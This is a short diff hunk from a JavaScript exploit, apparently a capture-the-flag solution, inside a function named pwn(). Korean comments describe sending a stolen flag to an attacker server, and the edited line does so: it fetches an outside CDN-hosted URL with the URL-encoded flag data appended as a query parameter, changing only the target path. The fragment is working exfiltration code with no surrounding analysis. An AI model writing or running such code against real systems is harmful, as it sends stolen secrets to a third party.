@@ -62,7 +62,7 @@ async function pwn() {
     const flagData = await vaultRes.text();
 
     // 6. 탈취한 플래그를 공격자 서버로 전송 (URL 파라미터 활용)
-    await fetch('https://cdn.statically.io/gh/mod-siw/PhantomPass@main/test.js/?flag=' + encodeURIComponent(flagData));
+    await fetch('https://cdn.statically.io/gh/mod-siw/PhantomPass@main/code.js/?flag=' + encodeURIComponent(flagData));
 
   } catch (e) {
     // 디버깅용 에러 전송 
